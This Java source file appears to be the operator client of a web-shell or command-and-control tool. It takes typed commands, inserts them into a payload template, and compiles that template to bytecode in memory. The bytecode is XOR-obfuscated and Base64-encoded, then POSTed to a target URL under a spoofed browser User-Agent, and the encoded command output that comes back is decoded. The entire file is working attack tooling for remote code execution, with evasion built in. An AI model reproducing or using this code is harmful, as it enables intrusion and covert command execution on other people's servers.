import java.io.*;
import java.lang.Process;
import java.lang.Runtime;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.Scanner;
import javax.tools.*;

public class client {

    static String generateRandomString() {
        Random random = new Random();
        int minLength = 4;
        int maxLength = 25;
        int length = random.nextInt(maxLength - minLength + 1) + minLength;
        StringBuilder sb = new StringBuilder(length);

        String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

        for (int i = 0; i < length; i++) {
            int randomIndex = random.nextInt(characters.length());
            char randomChar = characters.charAt(randomIndex);
            sb.append(randomChar);
        }

        return sb.toString();
    }

    static String generateTemplate(String filePath, String cmd) {

        String fileContent = "";
        try {
            
            cmd = cmd.replace("\\", "\\\\");
            cmd = cmd.replace("\"", "\\\"");
            cmd = '"' + cmd + '"';

            fileContent = new String(Files.readAllBytes(Paths.get(filePath)));
            fileContent = fileContent.replace("%CMD%", cmd);

            int count = 1;
            while (fileContent.contains("%" + count + "%")) {
                String placeholder = "%" + count + "%";
                String randomString = generateRandomString();
                fileContent = fileContent.replace(placeholder, randomString);
                count++;
            }

        } catch (IOException e) {
            e.printStackTrace();
        }

        return fileContent;
    }

    static byte[] compileBytecode(String javaSourceCode) {
        JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();

        StringBuilder content = new StringBuilder();

        Reader inpString = new StringReader(javaSourceCode);
        try (BufferedReader reader = new BufferedReader(inpString)) {
            String line;
            while ((line = reader.readLine()) != null) {
                content.append(line).append("\n");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        byte[] byteCode = new byte[0];
        try (StandardJavaFileManager fileManager = compiler.getStandardFileManager(null, null,
                StandardCharsets.UTF_8)) {
            CustomByteCodeFileManager classFileManager = new CustomByteCodeFileManager(fileManager);
            JavaFileObject javaFileObject = new JavaSourceFromString(javaSourceCode);

            // JavaCompiler.CompilationTask task = compiler.getTask(null, classFileManager,
            // null, null, null,List.of(javaFileObject));

            JavaCompiler.CompilationTask task = compiler.getTask(null, classFileManager, null, null, null,
                    Arrays.asList(javaFileObject));

            boolean compilationResult = task.call();

            if (!compilationResult) {
                throw new IOException("Compilation failed!");
            }

            byteCode = classFileManager.getCompiledBytecode();
        } catch (IOException e) {
            e.printStackTrace();
        }

        return byteCode;
    }

    private static class CustomByteCodeFileManager extends ForwardingJavaFileManager<StandardJavaFileManager> {
        private CustomByteCodeJavaFileObject classFileObject;

        public CustomByteCodeFileManager(StandardJavaFileManager fileManager) {
            super(fileManager);
        }

        @Override
        public JavaFileObject getJavaFileForOutput(Location location, String className, JavaFileObject.Kind kind,
                FileObject sibling) {
            classFileObject = new CustomByteCodeJavaFileObject(className, kind);
            return classFileObject;
        }

        public byte[] getCompiledBytecode() throws IOException {
            return classFileObject.getBytecode();
        }
    }

    private static class CustomByteCodeJavaFileObject extends SimpleJavaFileObject {
        private final ByteArrayOutputStream byteStream = new ByteArrayOutputStream();

        public CustomByteCodeJavaFileObject(String className, Kind kind) {
            super(URI.create("string:///" + className.replace('.', '/') + kind.extension), kind);
        }

        @Override
        public OutputStream openOutputStream() throws IOException {
            return byteStream;
        }

        public byte[] getBytecode() {
            return byteStream.toByteArray();
        }
    }

    private static class JavaSourceFromString extends SimpleJavaFileObject {
        private final String code;

        public JavaSourceFromString(String code) {
            super(URI.create("string:///DynamicClass.java"), Kind.SOURCE);
            this.code = code;
        }

        @Override
        public CharSequence getCharContent(boolean ignoreEncodingErrors) {
            return code;
        }
    }

    private static class BytecodeClassLoader extends ClassLoader {
        public Class<?> loadClass(byte[] bytecode) {
            return defineClass(null, bytecode, 0, bytecode.length);
        }
    }

    /*
     * 
     * 
     * 
     * MAIN
     * 
     * 
     */

    public static void main(String[] args) {

        if (args.length != 1) {
            System.out.println("Please provide a URL as an argument.");
            return;
        }

        try {

            String urlString = args[0];
            Scanner scanner = new Scanner(System.in);
            boolean exit = false;

            do {

                // Read user input
                System.out.print("Enter input: ");
                String userInput = scanner.nextLine();

                if (userInput.equals("exit")) {
                    exit = true;
                    break;
                }

                String template = generateTemplate("payload_template.java", userInput);

                byte[] byteCode = new byte[0];

                String commandOutput = "";

                byteCode = compileBytecode(template);
                // System.out.write(byteCode);

                // BytecodeClassLoader classLoader = new BytecodeClassLoader();
                // Class<?> clazz = classLoader.loadClass(byteCode);
                // Object obj = clazz.getDeclaredConstructor().newInstance();

                // Method runMethod = clazz.getDeclaredMethod("run");
                // Object result = runMethod.invoke(obj);

                // if (result instanceof String) {
                // commandOutput = (String) result;
                // }

                // System.out.println(commandOutput);

                // Generate a random byte - xor key
                Random random = new Random();
                byte randomByte = (byte) random.nextInt(256);

                byte[] encodedBytes = new byte[1 + byteCode.length];
                encodedBytes[0] = randomByte;

                for (int i = 0; i < byteCode.length; i++) {
                    encodedBytes[i + 1] = (byte) (byteCode[i] ^ randomByte);
                }

                // Base64 encode the resulting byte array
                String encodedString = Base64.getEncoder().encodeToString(encodedBytes);

                // Print the encoded string
                // System.out.println("Encoded String: " + encodedString);

                URL url = new URL(urlString);

                // Open a connection
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();

                // Set the request method to POST
                conn.setRequestMethod("POST");

                // Set the User-Agent header to mimic Mozilla Firefox
                conn.setRequestProperty("User-Agent",
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3");

                // Enable input and output streams
                conn.setDoInput(true);
                conn.setDoOutput(true);

                // Set the request data
                String requestData = encodedString;
                byte[] postData = requestData.getBytes();

                // Set the Content-Type header
                // conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                // Set the Content-Length header
                conn.setRequestProperty("Content-Length", String.valueOf(postData.length));

                // Write the request data to the output stream
                OutputStream os = conn.getOutputStream();
                os.write(postData);
                os.flush();
                os.close();

                // Get the response code
                int responseCode = conn.getResponseCode();
                System.out.println("Response Code: " + responseCode);

                // Read the response body
                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                String line;
                StringBuilder responseBody = new StringBuilder();
                while ((line = reader.readLine()) != null) {
                    responseBody.append(line + "\n");
                }
                reader.close();

                // System.out.println(responseBody.toString());
                byte[] decodedBytes = Base64.getDecoder().decode(responseBody.toString().trim());

                byte firstByte = decodedBytes[0];
                for (int i = 0; i < decodedBytes.length - 1; i++) {
                    decodedBytes[i] = (byte) (decodedBytes[i + 1] ^ firstByte);
                }

                String executionOutput = new String(Arrays.copyOf(decodedBytes, decodedBytes.length - 1));

                // Print the response body
                System.out.println("Response Body: " + executionOutput);

                // Disconnect the connection
                conn.disconnect();

            } while (exit != true);

        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
